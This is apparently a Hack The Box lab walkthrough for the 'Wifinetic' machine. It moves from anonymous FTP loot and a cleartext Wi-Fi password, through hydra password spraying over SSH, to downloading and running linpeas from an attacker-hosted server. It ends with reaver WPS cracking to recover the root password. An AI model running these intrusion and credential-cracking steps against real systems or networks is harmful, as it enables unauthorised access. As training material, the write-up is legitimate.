# Wifinetic - Easy

```sh
sudo vim /etc/hosts
# map wifinetic.htb

nmap -T4 -p- -A -Pn -v wifinetic.htb
```

* Open ports & services:

    * 21/tcp - ftp - vsftpd 3.0.3
    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
    * 53/tcp - tcpwrapped

* Enumerating FTP:

    ```sh
    ftp wifinetic.htb
    # anonymous login works

    dir
    # we have 5 files

    mget *
    # fetch all

    exit 
    ```

* The '.txt' and '.pdf' files give us some email addresses - 'info@wifinetic.htb', 'management@wifinetic.htb', 'samantha.wood93@wifinetic.htb' and 'olivia.walker17@wifinetic.htb' - Olivia Walker and Samantha Wood could be users on the box

* The '.tar' file can be extracted, it seems to be a backup of the ```/etc/``` directory - we can check for any sensitive info

* The files are likely for a OpenWRT system (to act as a wifi router), so there's a lot of interesting info; from the 'config' folder, we get a cleartext password 'VeRyUniUqWiFIPasswrd1!' in one of the files

* From the ```passwd``` file, while we do not get any hashes, we get a username 'netadmin'

* We can check for password re-use with SSH for all the enumerated usernames:

    ```sh
    vim usernames.txt
    # add all the usernames found so far

    hydra -L usernames.txt -p 'VeRyUniUqWiFIPasswrd1!' wifinetic.htb ssh
    # password valid for 'netadmin' user
    ```

* We can SSH as 'netadmin' now and enumerate for privesc:

    ```sh
    ssh netadmin@wifinetic.htb

    ls -la
    # get user flag

    sudo -l
    # cannot run sudo commands

    ls -la /home
    # we have a lot of users here
    # enumerate all of them for any sensitive data

    # we cannot access any of the users .ssh folders

    # we can enumerate using linpeas.sh

    # in attacker machine
    python3 -m http.server

    # in netadmin ssh
    wget http://10.10.12.18:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* ```linpeas``` shows that we have a non-standard binary ```/usr/bin/reaver``` with capabilities ```cap_net_raw+ep``` - we can try to see what it does:

    ```sh
    /usr/bin/reaver
    # it seems to be a wifi attack tool
    # we can use it for wifi cracking

    # to use reaver, we need an interface in monitor mode and a BSSID

    ip l
    # list interfaces
    # we need an interface in monitor mode
    # usually aircrack-ng or similar tool brings it in monitor mode, but we do not have that tool here

    iwconfig
    # utility to check if interface is in managed or monitor mode
    # this shows 'mon0' interface is in monitor mode already

    wash -i mon0
    # fetch BSSIDs of networks
    # this command does not give any output, likely no other BSSID detected
    # we can try this with other switches, but no output

    iwconfig
    # this command shows the BSSID of the currently connected access point
    # we can try reaver with that

    reaver -i mon0 -b 02:00:00:00:00:00 -vv
    # this works and we get the WPA PSK
    ```

* The WPA PSK 'WhatIsRealAnDWhAtIsNot51121!' seems like another password - we can try checking for password reuse with root:

    ```sh
    su
    # use the above password
    # it works, we are root

    cat /root/root.txt
    # root flag
    ```
